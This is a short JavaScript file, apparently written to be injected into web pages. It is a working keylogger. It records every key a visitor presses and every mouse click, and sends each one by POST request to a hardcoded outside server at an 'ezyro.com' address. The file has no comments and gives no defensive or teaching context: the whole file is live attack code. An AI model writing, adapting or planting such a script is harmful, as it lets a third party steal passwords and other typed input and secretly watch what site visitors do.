(function(){
	var server = "http://boofdev126.ezyro.com/kl/server.php";
	document.addEventListener("keyup", function(e){
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(e.key);
	});
	
	document.addEventListener("click", function(e){
		var click;
		if(e.which == 1){
			click = " Left Click ";
		}else{
			click = " Right Click ";
		}
		
		var x = new XMLHttpRequest();
		x.open("POST", server, true);
		x.send(click);
	});
})();
